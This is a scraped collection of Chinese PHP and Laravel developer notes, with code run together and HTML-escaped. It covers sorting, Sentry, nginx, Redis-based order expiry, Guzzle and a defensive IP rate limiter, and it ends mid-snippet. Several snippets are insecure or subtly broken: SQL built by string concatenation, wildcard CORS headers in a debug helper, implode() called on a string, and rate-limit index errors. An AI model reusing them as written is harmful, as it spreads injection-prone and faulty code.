while($j&gt;-1&amp;&amp;$x&lt;@$data[$j]-&gt;id)&#123; $data[$j+1] = $data[$j]; $j--; &#125; $data[$j+1] = $obj; &#125; &#125;&#125;(function()&#123; $person = new Person(); $index = ['23'=&gt;'勺颠颠','65'=&gt;'老油条','21'=&gt;'烧包谷','9'=&gt;'烧耳块','4'=&gt;'肥嘟嘟','7'=&gt;'霉戳戳','32'=&gt;'一坨肉','6'=&gt;'老扎哇']; $data = []; foreach ($index as $k=&gt;$v)&#123; $obj = clone $person; $obj-&gt;id = $k; $obj-&gt;data = $v; $data[] = $obj; &#125; insertSort($data,8); print_r($data);&#125;)(); 分表12345678910111213141516171819202122namespace App\Models;use DB;use Schema;use Illuminate\Database\Eloquent\Model;class Logs extends Model&#123; protected $guarded = ['id']; protected $table; public function __construct(array $attributes = []) &#123; parent::__construct($attributes); $this-&gt;table = 'log_'.date('Y'); if (!Schema::hasTable($this-&gt;table)) &#123; DB::update('create table '.$this-&gt;table.' like logs'); &#125; &#125;&#125;Logs::where('uid','')-&gt;first(); sentry 升级1234567891011121314151617181920212223242526272829303132333435server &#123; listen 80; server_name track.example.com; set_real_ip_from 127.0.0.1; real_ip_header X-Forwarded-For; real_ip_recursive on; location / &#123; // 添加这两行 default_type text/html; // 设置 content-type 表示这是一个网页 return 202; # 返回 202 表示已经接收，但是并不处理 client_max_body_size 100M; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host-Real-IP $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Real-Pcol http; proxy_pass http://localhost:10000; &#125;&#125;使用这两行，就可以保证客户端正常请求了数据，但是我却把它给抛弃了。保证客户端的正常浏览。cd /data/cp -r onpremise onpremise2cd onpremisedocker-compose downgit pullgit diff docker-compose.ymlgit checkout docker-compose.ymlgit pullexport SENTRY_IMAGE='sentry:9.1.2'docker-compose build --pulldocker-compose run --rm web upgradedocker-compose up -dhttps://learnku.com/articles/32569 基于雪花算法的 PHP ID 生成器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051https://github.com/godruoyi/php-snowflake$ composer require godruoyi/php-snowflake -vvv$snowflake = new \Godruoyi\Snowflake\Snowflake;$snowflake-&gt;id();// 1537200202186752$snowflake = new \Godruoyi\Snowflake\Snowflake($datacenterId, $workerId);$snowflake-&gt;id();$snowflake = new \Godruoyi\Snowflake\Snowflake;$snowflake-&gt;setStartTimeStamp(strtotime('2019-09-09')*1000);$snowflake-&gt;id();集合laravel// App\Providers\AppServiceProvideruse Godruoyi\Snowflake\Snowflake;use Godruoyi\Snowflake\LaravelSequenceResolver;class AppServiceProvider extends ServiceProvider&#123; /** * Register any application services. * * @return void */ public function register() &#123; $this-&gt;app-&gt;singleton('snowflake', function () &#123; return (new Snowflake()) -&gt;setStartTimeStamp(strtotime('2019-08-08')*1000) -&gt;setSequenceResolver(new LaravelSequenceResolver( $this-&gt;app-&gt;get('cache')-&gt;store() )); &#125;); &#125;&#125;$snowflake = new \Godruoyi\Snowflake\Snowflake;$snowflake-&gt;setSequenceResolver(function ($currentTime) &#123; static $lastTime; static $sequence; if ($lastTime == $currentTime) &#123; ++$sequence; &#125; $lastTime = $currentTime; return $sequence;&#125;)-&gt;id();https://learnku.com/articles/32575 内置web服务器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106php -S localhost:8000 -t public/cd /home/baoguoxiao/www/php/demophp -S localhost:8000 router.phprouter.php 文件的代码/** * 对URL进行解析，并获取请求的文件名 */$uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));/** * 判断是否存在该文件，如果不存在，则直接继续加载入口文件 */if ($uri !== "/" &amp;&amp; file_exists(__DIR__ . "$uri")) &#123; return false;&#125;/** * 加载入口文件 */require_once "./index.php";vendor/laravel/framework/src/Illuminate/Foundation/Console/ServeCommand.php/** * 执行命令. * * @return int * * @throws \Exception */public function handle()&#123; // 切换路径到 public 目录 chdir(public_path()); // 在命令台进行输出相关内容 $this-&gt;line("&lt;info&gt;Laravel development server started:&lt;/info&gt; &lt;http://&#123;$this-&gt;host()&#125;:&#123;$this-&gt;port()&#125;&gt;"); // 执行外部程序，并且 $status 为系统的返回状态 passthru($this-&gt;serverCommand(), $status); // $status 为0 表示执行正常, 为其他大于0的数字表示出现了错误，有可能是端口被抢占了，这个时候就会接着判断是否进行再次尝试 if ($status &amp;&amp; $this-&gt;canTryAnotherPort()) &#123; // 对绑定的端口号加1 默认是8000, 如果失败则重试端口号为8001，再次失败重试端口号为8002，以此类推。 $this-&gt;portOffset += 1; // 再次调用此程序 return $this-&gt;handle(); &#125; // 返回状态值 return $status;&#125;/** * 获取完整的 server 命令. * * @return string */protected function serverCommand()&#123; return sprintf('%s -S %s:%s %s', // 获取PHP可执行命令的路径 ProcessUtils::escapeArgument((new PhpExecutableFinder)-&gt;find(false)), // 获取需要绑定的host $this-&gt;host(), // 获取需要绑定的端口 $this-&gt;port(), // 对需要执行的参数进行转义处理。这里的 server 就是我们之前说的路由文件，它在项目的根路径下 ProcessUtils::escapeArgument(base_path('server.php')) );&#125;对上面的命令进行翻译一下，实际上就是执行的cd ./publicphp -S 0.0.0.0:8000 ../server.phpnote:这里我们可以看到一个区别就是之前我自己写的代码，host 都是 localhost, 但是这里写的是 0.0.0.0。这两个有什么区别呢？其实区别很简单，比如我之前写的 localhost 绑定的ip 是 127.0.0.1, 这个相当于一个回环地址，那么我们就只允许本机的IP进行访问。而 0.0.0.0，则表示我们对ip不进行限制，所有的IP都可以进行访问。那我们接着再来看看项目根目录下面的server.php:/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */$uri = urldecode( parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));// 这个文件允许我们从内置 PHP web 服务器中模拟 Apache 的 "mod_rewrite" 功能.// 这提供了一种测试 Laravel 应用程序的便捷方法,// 而无需在此安装"真正的" web 服务器软件。if ($uri !== '/' &amp;&amp; file_exists(__DIR__.'/public'.$uri)) &#123; return false;&#125;require_once __DIR__.'/public/index.php';https://github.com/mowangjuanzi/blog/blob/master/posts/2019.05.18-php_built_in_web_server.md 响应宏123456789101112131415161718192021222324252627282930在任意一个ServiceProvider的boot方法里（ResponseMacroServiceProvider），使用Response Facade注册Response::macro('success', function ($data = [], $message = 'success') &#123; return new JsonResponse([ 'code' =&gt; 0, 'data' =&gt; $data, 'message' =&gt; $message ], 200);&#125;);接下来， 你可以再任何地方使用它response()。//UserController.phppublic function users(UserRepository $userRepository)&#123; return response()-&gt;success($userRepository-&gt;all(), 'success');&#125;注意，你只能通过response()这个全局方法或是app('Illuminate\Routing\ResponseFactory')来使用它response()-&gt;success();//OKapp('Illuminate\Routing\ResponseFactory')-&gt;success();//OK//Response FacadeResponse::success();//ok(new \Illuminate\Http\Response)-&gt;success();//Errorhttps://godruoyi.com/posts/laravel-response-macro-principle Intervention Image 合成图片12345678910111213141516171819202122232425262728use Intervention\Image\ImageManager;$manager = new ImageManager(array('driver' =&gt; 'imagick'));use Intervention\Image\Facades\Image;//或$manager = app('image');// $image = $manager-&gt;make($bg);// $image = Image::make($bg);$image = app('image')-&gt;make($bg);// 二维码图片$qrcodeImage = app('image')-&gt;make($qrcodeurl)-&gt;resize(200, 200);// 重置 头像 大小$avatarImage = app('image')-&gt;make($httpClient-&gt;request('GET', $avatarurl)-&gt;getBody())-&gt;resize(200, 200);$image-&gt;text('Nickname', 376, 320, function ($font) &#123; $font-&gt;file(public_path('fonts/SimHei.ttf')); $font-&gt;size(40); $font-&gt;color('#000000'); $font-&gt;align('center'); $font-&gt;valign('top');&#125;);$image-&gt;insert($qrcodeImage, 'bottom', 0, 360);$image-&gt;insert($avatarImage, 'top', 0, 105);中文字体文件https://github.com/StellarCN/scp_zh/tree/master/fonts nginx 配置多域名12345678910111213这个是精确匹配问题：nginx server_name 匹配不到时，默认取第一个 server &#123; &#125; (端口和 ip 一致)你项目中配置:1. server_name www.test.com2. server_name www.mytest.com访问 test.com/mytest.com 都找不到对应的 server_name (www.test.com != test.com , www.mytest.com != mytest.com)，所以就取第一个 server &#123; &#125; 匹配，所以均输出 testserver_name mytest.com *.mytest.comhttps://learnku.com/laravel/t/32300 插入折半排序12345678910111213141516171819202122232425262728293031323334353637383940414243class Person&#123; public $id; public $data;&#125;function insertSort(&amp;$data,$n)&#123; for ($i=1;$i&lt;$n;$i++)&#123; $low = 0; $high = $i-1; $temp = $data[$i]; while ($low&lt;=$high)&#123; $mid = floor(($low+$high)/2); if ($data[$mid]-&gt;id&gt;$temp-&gt;id)&#123; $high = $mid-1; &#125;else&#123; $low = $mid+1; &#125; &#125; for ($j=$i;$j&gt;$low;$j--)&#123; $data[$j] = $data[$j-1]; &#125; $data[$low] = $temp; &#125;&#125;(function()&#123; $person = new Person(); $index = ['23'=&gt;'勺颠颠','65'=&gt;'老油条','21'=&gt;'烧包谷','9'=&gt;'烧耳块','4'=&gt;'肥嘟嘟','7'=&gt;'霉戳戳','32'=&gt;'一坨肉','6'=&gt;'老扎哇']; $data = []; foreach ($index as $k=&gt;$v)&#123; $obj = clone $person; $obj-&gt;id = $k; $obj-&gt;data = $v; $data[] = $obj; &#125; insertSort($data,8); print_r($data);&#125;)(); https://learnku.com/articles/32691 sql拼接1234$statusInStr = implode(',', '1,2,3');字符串$statusInStr = "'".implode("','", [1,2,3])."'";//'1','2','3'"select * from table where status in (&#123;$statusInStr&#125;)"//select * from table where status in ('1','2','3') x-www-form-urlencoded 与 multipart/form-data123456789101112131415161718192021222324252627282930313233343536373839404142434445464748x-www-form-urlencoded，表单默认的 Content-type 类型，支持 ASCII-text 文本内容multipart/form-data，允许提交表单包含： files，non-ASCII-text，Binary 类型数据当表单使用 application/x-www-form-urlencoded 时，需要对参数进行 urlencode 编码和序列化如，表单提交参数（key-value）为：param1:websiteparam2:https://www.google.com经过 urlencode 编码后：param1:websiteparam2:https%3A%2F%2Fwww.google.com再经过序列化，得到结果param1=website&amp;param2=https%3A%2F%2Fwww.google.commultipart/form-data一个 multipart/form-data 消息体，包含多个块组成，每个块代表一个有效的表单控件，并使用 boundary 的字符串分割：第一部分，Content-Disposition: form-data 参数名称，如，name="my_control第二部分，Content-Type: text/plain，Content-Type: image/png第三部分，消息内容例如表单：&lt;FORM action="http://server.com/cgi/handle" enctype="multipart/form-data" method="post"&gt; &lt;P&gt; What is your name? &lt;INPUT type="text" name="submit-name"&gt;&lt;BR&gt; What files are you sending? &lt;INPUT type="file" name="files"&gt;&lt;BR&gt; &lt;INPUT type="submit" value="Send"&gt; &lt;INPUT type="reset"&gt;&lt;/FORM&gt;假设，submit-name 输入 Larry 文本，files 选择文件 file1.txtContent-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x--https://learnku.com/articles/32812 Model::setAttribute()1234567891011121314151617181920App\GameWork::create([ "task_id" =&gt; "23571", "type" =&gt; 2, "take_time" =&gt; "1563085291", "send_time" =&gt; 1563093004, "chufa" =&gt; 10, "worker" =&gt; 0, "work_time" =&gt; 0, "log" =&gt; "超时", "uid" =&gt; 271, "game_id" =&gt; 3532054, "buyer_id" =&gt; 64]);结果提示我TypeError: Too few arguments to function Illuminate/Database/Eloquent/Model::setAttribute(), 1 passed in /Library/WebServer/Documents/api/vendor/laravel/framework/src/Illuminate/Database/Eloquent/Concerns/HasAttributes.php on line 617 and exactly 2 expected把自增关闭就好了，laravel 默认是所有表都有个自增 ID，我的表不需要public $incrementing = false;https://learnku.com/laravel/t/31164 处理unicode解码1234567891011// change unicode to unt-8function replace_unicode_escape_sequence($match) &#123; return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');&#125;function unicode_decode($str) &#123; return preg_replace_callback('/u([0-9a-f]&#123;4&#125;)/i', 'replace_unicode_escape_sequence', $str); &#125;$str = unicode_decode('&#123;"u5173u952eu8bcd":[&#123;"","key":"u767eu5ea6"&#125;]&#125;');//&#123;"关键词":[&#123;"","key":"百度"&#125;]&#125;如果编码是 \u5173\u952e\u8bcd 正则改为/\u([0-9a-f]&#123;4&#125;)/i 即可http://cuihuan.net/2015/11/28/php%20%E5%A4%84%E7%90%86unicode%E8%A7%A3%E7%A0%81/ 恶意提交攻击12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 // check 环境ip if (!$this-&gt;isWhiteList($ip)) &#123; $echo_str = "提交过于频繁,请稍后再试！"; // 构建ip的时间栈数据 if (!is_array($_SESSION[$ip])) &#123; $_SESSION[$ip] = array(); &#125; if (isset($_SESSION[$ip][0])) &#123; $_SESSION[$ip][] = time(); // session 保存时间为6小时。清理session $post_interval_first = time() - $_SESSION[$ip][0]; if ($post_interval_first &gt; 21600) &#123; $_SESSION[$ip] = array(); &#125; // 两次提交小于1s，禁止提交 $post_interval_pre = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if ($post_interval_pre &lt; 1) &#123; echo $echo_str; exit; &#125;; // 您在10s内已经提交了3请求，禁止提交 $post_interval_third = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if (isset($_SESSION[$ip][3]) &amp;&amp; ($post_interval_third &lt; 10)) &#123; echo $echo_str; exit; &#125; // 您在1分钟期间已经提交了5请求，禁止提交 $post_interval_fifth = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if (isset($_SESSION[$ip][5]) &amp;&amp; ($post_interval_fifth &lt; 60)) &#123; echo $echo_str; exit; &#125; // 6小时内提交10次，禁止提交 if (isset($_SESSION[$ip][10])) &#123; echo $echo_str; exit; &#125; &#125; else &#123; $_SESSION[$ip][] = time(); &#125; &#125;function isWhiteList($ip)&#123; /** * 内网ip默认全部存在于白名单中 */ if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))&#123; return true; &#125; // 是否在写死的whitelist 里面 return in_array($ip,$this-&gt;_WHTTE_LIST);&#125;http://cuihuan.net/2016/01/07/%E6%9C%BA%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%81%B6%E6%84%8F%E6%8F%90%E4%BA%A4%E6%94%BB%E5%87%BB/ 切换镜像12345678composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/composer update -vvv执行成功以后，打开 composer.lock, 发现文件中的链接依旧是 laravel-china 的地址删掉 lock，再 install，会安装最新的包，在生产环境这样，可能会搞出事来，，composer update nothing 直接这样，就可以只更新 lock 文件里的源 composer Failed to execute unzip12345678 composer 多线程下载的扩展包（hirak/prestissimo），因为是全局安装的，其原理就是下到缓存，然后以后全部都走缓存安装。所以我第一件事 先全局卸载掉它composer global remove hirak/prestissimo然后清空当前 composer 的缓存composer clear-cache然后使用 laravel new blog， 你会发现没有报错了。https://learnku.com/articles/32898 sentry12345678910111213141516$ git clone https://github.com/getsentry/onpremise.git$ cd onpremise$ ./install.sh$ docker-compose up -d在目录下的 docker-compose.yml 添加配置：SENTRY_EMAIL_HOST: smtp.exmail.qq.comSENTRY_EMAIL_USER: 你的邮箱地址SENTRY_EMAIL_EMAIL: 你的邮箱地址SENTRY_EMAIL_PASSWORD: 授权码SENTRY_EMAIL_USE_TLS: 'true'SENTRY_EMAIL_PORT: 587重启 sentry 服务docker-compose down &amp;&amp; docker-compose up -d 抽离 vendor1234567891011121314在 bootstrap 注册 autoload 就可以了。./bootstrap/app.php&lt;?phprequire_once __DIR__ . '/../vendor/autoload.php';$autoload = new Composer\Autoload\ClassLoader();$autoload-&gt;addPsr4('App\\', "../app/");$autoload-&gt;addClassMap([ "database/", "tests/"]);$autoload-&gt;register();https://learnku.com/laravel/t/32840 dd 函数12345678910111213function dd(...$args) &#123; header('Access-Control-Allow-Origin: *'); header('Access-Control-Allow-Methods: *'); header('Access-Control-Allow-Headers: *'); http_response_code(500); foreach ($args as $x) &#123; (new Illuminate\Support\Debug\Dumper)-&gt;dump($x); &#125; die(1); &#125; listen sql1234\DB::listen(function (QueryExecuted $sql) &#123; \Log::info($sql-&gt;sql); \Log::info((new \Exception())-&gt;getTraceAsString());&#125;); 模型事件 updated12345678910只有 $sku-&gt;&#123;attribute&#125; != $sku-&gt;getOriginal(&#123;attribute&#125;) 不一致的时候才会触发 getDirty() 不为空的时候才触发, 而且不会比较数据类型(判断是否 dirty 使用的是 == 而不是 ===)直接 app(Model::class)-&gt;where()-&gt;update() 不会触发 $sku = app(Sku::class), $sku-&gt;has_stock = 1; $sku-&gt;save() 这样才会触发这是因为，使用 app(Model::class)-&gt;where()-&gt;update() 的时候，调用的是 Query/Builder 的 update 方法，这里面是没法触发 update 事件的。使用 $sku = app(Sku::class), $sku-&gt;has_stock = 1; $sku-&gt;save() 的时候，使用的 update 方法是 Eloquent/Model 里面的 update 方法。https://blog.baiguiren.com/2019/04/22/laravel/Laravel%20%E6%A8%A1%E5%9E%8B%E4%BA%8B%E4%BB%B6%20updated%20%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/ 获取所有 collection123foreach (\DB::connection('xxx')-&gt;getMongoDB()-&gt;listCollections() as $collection) &#123; echo $collection-&gt;getName() . PHP_EOL;&#125; 获取带参数的 sql 语句1234567891011121314151617DB::table('users')-&gt;where('id', 1)-&gt;toSql();select * from `users` where `id` = ?$builder = DB::table('users')-&gt;where('id', 1);$bindings = $builder-&gt;getBindings();$sql = str_replace('?', '%s', $builder-&gt;toSql());$sql = sprintf($sql, ...$bindings);select * from `tb_user` where `id` = 1\Illuminate\Database\Query\Builder::macro('sql', function () &#123; $bindings = $this-&gt;getBindings(); $sql = str_replace('?', '%s', $this-&gt;toSql()); return sprintf($sql, ...$bindings);&#125;);dd(DB::table('users')-&gt;where('id', 1)-&gt;sql());https://blog.baiguiren.com/2018/06/27/laravel/Laravel%20%E4%B8%AD%E7%9A%84%20toSql%20%E8%8E%B7%E5%8F%96%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%20sql%20%E8%AF%AD%E5%8F%A5/ 命令行输出进度条1234567891011121314151617181920212223242526272829303132333435363738namespace App\Commands; use Illuminate\Console\Command;use Symfony\Component\Console\Helper\ProgressBar;use Symfony\Component\Console\Output\ConsoleOutput; class Test extends Command&#123; protected $signature = 'test'; /** * Execute the command. * * @return void */ public function handle() &#123; // $output = new ConsoleOutput(); $progressBar = new ProgressBar($output, 1000); $progressBar-&gt;setFormat(" %elapsed:6s%/%estimated:-6s% 内存消耗: %memory:6s%\n%current%/%max% [%bar%] %percent:3s%%"); foreach (range(1, 1000) as $_) &#123; usleep(5000); $progressBar-&gt;advance(); &#125; $progressBar-&gt;finish(); echo "\n"; &#125;&#125;$progressBar-&gt;start();print "\n";$progressBar-&gt;start();$progressBar-&gt;setFormat("已处理数量: %count%"); // 这里是一个占位符，可以和进度条写在一起$progressBar-&gt;setMessage($count, 'count'); // 使用 `$count` 替换输出内容中的 "%$count%" with 通过闭包筛选12345678910111213141516171819202122232425262728class User extends Model&#123; public function profile() &#123; return $this-&gt;hasOne('App\UserProfile'); &#125;&#125;App\User::with([ 'profile' =&gt; function($query) &#123; $query-&gt;select(['id']); &#125;])-&gt;find(4)-&gt;toArray();即使数据库有记录，sql 也记录了对应的查询语句，但是 profile 关联却是空的App\User::with([ 'profile' =&gt; function($query) &#123; $query-&gt;select(['id', 'user_id']); // 多了 user_id &#125;])-&gt;find(4)-&gt;toArray();可以查找到正确的 profile 了hasMany 方法默认第二第三个参数其实就是这两个集合建立关联的关键，第三个参数 user_id、第四个参数 id；这样一来我们就可以通过比较 Profile 的 user_id 和 User 里面的 id，如果相等，则这个 Profile 是属于这个 User 的，我们就把该 Profile 放进 User 的 profile 关联中，最后就得到我们想要的结果了Laravel 先查询主要的数据(不带 with)，查询完了之后，取出其中的 id 列数组(不一定都是id啊，只是举个例子)，将这个数组作为条件去查找关联，有多少个关联就会再去查找多少次，查找完关联之后通过得到的结果的主键和关联数据的外键比对，相等则建立关联。总结：在关联筛选 field 的时候，也必须要把关联的外键写进去，否则，即使产生了正确的 sql 语句，但是它们建立不了关联，通过 $user-&gt;profile 得到的还是一个空集合。https://blog.baiguiren.com/2018/01/06/laravel/Laravel%205.1%20Eloquent%20with%20%E9%80%9A%E8%BF%87%E9%97%AD%E5%8C%85%E7%AD%9B%E9%80%89%E7%89%B9%E5%AE%9A%20field%20%E5%BE%97%E4%B8%8D%E5%88%B0%E7%BB%93%E6%9E%9C%E7%9A%84%E9%97%AE%E9%A2%98/ Laravel cookie加密解密12345678910111213141516171819$data = 'laravel';$iv = random_bytes(16);$key = 'this is key'; $encrypt = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv); var_dump($encrypt);var_dump(openssl_decrypt($encrypt, 'AES-256-CBC', $key, 0, $iv));Laravel 中的话，key 就是 .env 配置文件里面的 APP_KEY，除了 key 还有两个变化的参数就是 加密、解密的数据以及 iv。也就是说，如果我们需要加密 cookie 的话，我们至少得保存下 加密后的数据以及 iv虽然每次请求 cookie 都会发生变化，但是实际数据是没有变的，发生变化只是因为用来加密的 iv 变了(使用 random_bytes 方法生成)。由于 iv 每次都变化，所以需要把 iv 也一同返回给浏览器，加上验证数据合法性的 mac，最后返回的就是下面的数组的 json 编码后在 base64 编码的数据：[ 'iv' =&gt; random_bytes(16), // 16位随机字节串 'value' =&gt; 'xxxx...', // 加密后的数据 'mac' =&gt; 'xxx...' // 后续请求验证数据合法性的字符串]https://blog.baiguiren.com/2018/01/11/laravel/Laravel%20cookie%20%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%8E%9F%E7%90%86/ Eloquent Builder 添加自定义方法12345678910111213141516171819202122232425262728\Illuminate\Database\Query\Builder\Builder::macro('active', function () &#123; return $this-&gt;where('status', 1);&#125;);DB::table(xxx)-&gt;active()-&gt;get();\App\Model\User::active()-&gt;first();在 app/Providers 下面新建一个 Provider，把 macro 调用放到 Provider 的 register 方法中namespace App\Providers; use Illuminate\Database\Query\Builder;use Illuminate\Support\ServiceProvider; /** @mixin \Illuminate\Database\Eloquent\Builder */class DatabaseServiceProvider extends ServiceProvider&#123; /** * Register any application services. * * @return void */ public function register() &#123; Builder::macro('active', function () &#123; return $this-&gt;where('status', 1); &#125;); &#125;&#125;加了 Providers 之后还要在 config/app.php 中配置这个 Provider。 修改模型对象的某个属性1234567891011121314151617181920212223242526272829303132333435$user = new User;$user-&gt;age = 26;dd($user-&gt;toArray(), $user-&gt;getAttributes()); // ['age' =&gt; 26], ['age' =&gt; 26]我们想修改里面属性的时候比如 $user-&gt;info['job'] = 'PHP';，实际上等同于： $user-&gt;__get('info')['job'] = 'PHP';也就是说，等同于： $temp = $user-&gt;__get('info');$temp['job'] = 'PHP';也就是说，我们在设置有层级的属性的时候，中间产生了临时变量。假设大家知道了值传递、引用传递的区别。这个时候问题就来了，如果这个 $user-&gt;info 是一个数组，我们最终修改的是一个临时数组，而 $user-&gt;info 还是不变。这个时候就报错了，因为这个修改是完全没有意义的。而如果 $user-&gt;info 是一个对象的时候，我们临时变量也是一个对象，而对象是通过引用传递的，我们修改了这个对象的时候，实际上也修改了 $user-&gt;info，因为这个临时变量指向了原始对象。$user = app(User::class);$user-&gt;infoObj = new stdClass;$user-&gt;infoObj-&gt;age = 26;$user-&gt;infoObj-&gt;job = 'PHP';// dd($user-&gt;toArray());// Indirect modification of overloaded property User::$info has no effect$user-&gt;info = [ 'age' =&gt; 26,];$user-&gt;info['job'] = 'PHP';https://blog.baiguiren.com/2018/07/05/laravel/Laravel%20Model%20-%20Indirect%20modification%20of%20overloaded%20property/ laravel技巧123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354使用一次查询代替多次查询AdminUser::with('admin_user_info')-&gt;where('id', '&gt;', 1)-&gt;get();$products = \DB::table('product')-&gt;where('category_id', 1)-&gt;paginate();$product_ids = $products-&gt;pluck('id')-&gt;toArray(); // 获取所有 id , 下面第二点有说到这个用法&lt;br&gt;$some_other_infos = \DB::table('some_other_info') // 根据 id 数组一次查询所有关联数据 -&gt;whereIn('product_id', $product_ids) -&gt;get(); $some_other_infos = array_column($some_other_infos, null, 'product_id'); // 使用 id 把结果集转换为关联数组，这样下面可以更高效地操作，否则我们只能两次 foreach 了foreach ($products as $key =&gt; $product) &#123; $product['some_other_info'] = array_get($some_other_infos, $product['id']); $products[$key] = $product;&#125;namespace App\Model; class AdminUser extends BaseModel&#123; public function admin_user_info() &#123; return $this-&gt;hasOne(AdminUserInfo::class); &#125;&#125;$adminUsers = AdminUser::limit(10)-&gt;get();$adminUsers-&gt;load('admin_user_info');array_get、data_get 方法代替多个 isset 判断// 获取一个用户下文章的一条评论$user = User::with(['article.comment'])-&gt;first();$content = isset($user-&gt;article) ? (isset($user-&gt;article-&gt;comment) ? $user-&gt;article-&gt;comment : '') : ''; // 传统写法$content = data_get($user, 'article.comment.content'); // 评论内容单数命名时候 Model 类不用定义 protected $table重写 Model 类的 getTable 方法public function getTable()&#123; if (isset($this-&gt;table)) &#123; return $this-&gt;table; &#125; return str_replace('\\', '', Str::snake(class_basename($this)));&#125;$validator = \Validator::make(request()-&gt;all(), [ 'buyer_id' =&gt; 'required', 'amount' =&gt; 'required|numeric|gt:0'], [ 'buyer_id.required' =&gt; ':attribute不能为空', 'amount.required' =&gt; '请填写:attribute', 'amount.numeric' =&gt; ':attribute必须为数字', 'amount.gt' =&gt; ':attribute必须大于0'], [ 'buyer_id' =&gt; '客户id', 'amount' =&gt; '金额']);if ($validator-&gt;fails()) &#123; return $this-&gt;ajaxFail($validator-&gt;messages()-&gt;first());&#125; https://blog.baiguiren.com/2018/07/29/laravel/%E4%B8%AA%E4%BA%BA%E5%9C%A8%20Laravel%20%E5%BC%80%E5%8F%91%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/ 外部调用类的私有方法12345678910111213141516171819202122232425262728293031323334353637class A&#123; protected $protected = 'protected'; private $private = 'private'; protected function protectedMethod() &#123; return 'Hello protected'; &#125; private function privateMethod() &#123; return 'Hello private'; &#125; public function __get($name) &#123; return $this-&gt;$name; &#125; public function __call($name, $arguments) &#123; return $this-&gt;$name(...$arguments); &#125;&#125;$test = new A();$test-&gt;protected;$test-&gt;private;$test-&gt;protectedMethod();$test-&gt;privateMethod();$test = function () &#123; echo $this-&gt;private; echo $this-&gt;privateMethod();&#125;;$test = $test-&gt;bindTo(new A(), 'A');$test(); 30 分钟未付款自动取消订单12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879先保证 redis 的版本大于 2.8 ，现在绝大部分不成问题了，然后修改 redis 的配置文件，加入：notify-keyspace-events "Ex"Cache::store('redis')-&gt;put('ORDER_CONFIRM:'.$order-&gt;id,$order-&gt;id,30); // 30分钟后过期--执行取消订单 然后我们来监听 ORDER_CONFIRM:ORDER_ID 的过期事件先建个命令，我们一会儿的监听全靠他了。php artisan make:command OrderExpireListen 然后把命令执行文件 app\Console\Commands\OrderExpireListen.php 写成这样:namespace App\Console\Commands;use App\Http\Models\Order;use Illuminate\Console\Command;use Illuminate\Support\Facades\Redis as Redis;class OrderExpireListen extends Command&#123; /** * The name and signature of the console command. * * @var string */ protected $signature = 'order:expire'; /** * The console command description. * * @var string */ protected $description = '监听订单创建，在30分钟后如果没付款取消订单。'; /** * Create a new command instance. * * @return void */ public function __construct() &#123; parent::__construct(); &#125; /** * Execute the console command. * * @return mixed */ public function handle() &#123; // $cachedb = config('database.redis.cache.database',0); $pattern = '__keyevent@'.$cachedb.'__:expired'; Redis::subscribe($pattern,function ($channel)&#123; // 订阅键过期事件 $key_type = str_before($channel,':'); switch ($key_type) &#123; case 'ORDER_CONFIRM': $order_id = str_after($channel,':'); // 取出订单 ID $order = Order::find($order_id); if ($order) &#123; $order-&gt;cancel(); // 执行取消操作 &#125; break; case 'ORDER_OTHEREVENT': break; default: break; &#125; &#125;); &#125;&#125; 文件好了之后，使用php artisan order:expire 解决自动断开连接超时现象你改下 app\config\database.php 中 redis 节，增加一个 read_write_timeout : 'redis' =&gt; [ 'client' =&gt; 'predis', 'default' =&gt; [ 'host' =&gt; env('REDIS_HOST', '127.0.0.1'), 'password' =&gt; env('REDIS_PASSWORD', null), 'port' =&gt; env('REDIS_PORT', 6379), 'database' =&gt; env('REDIS_DB', 0), 'read_write_timeout' =&gt; env('REDIS_RW_TIMEOUT', 5), // 读写超时设定 ], ],最后：使用supervisor监听order:expire http://118.25.60.91:9000/articles/30-fen-zhong-wei-fu-kuan-zi-dong-qu-xiao-ding-danhttps://crazyfzw.github.io/2019/03/26/redis-keyspace-notifications/ http://redisdoc.com/topic/notification.html guzzle异步请求123456789101112131415161718192021222324252627$request = new \GuzzleHttp\Psr7\Request('GET', 'http://www.example.com');$promise = $client-&gt;sendAsync($request)-&gt;then(function ($response) &#123; // 请求完成后的操作 $response-&gt;getBody();&#125;);$promise-&gt;wait();$client = new Client(['base_uri' =&gt; 'http://httpbin.org/ip']); $promise = $client-&gt;requestAsync('GET', 'http://httpbin.org/ip'); $promise-&gt;then( function (ResponseInterface $res) &#123; echo $res-&gt;getStatusCode() . "\n"; &#125;, function (RequestException $e) &#123; echo $e-&gt;getMessage() . "\n"; echo $e-&gt;getRequest()-&gt;getMethod(); &#125; ); dd($promise); "guzzlehttp/guzzle": "5.3.1", $client=new GuzzleHttp\Client(); $reqs = $client-&gt;createRequest('GET', 'http://httpbin.org/ip', 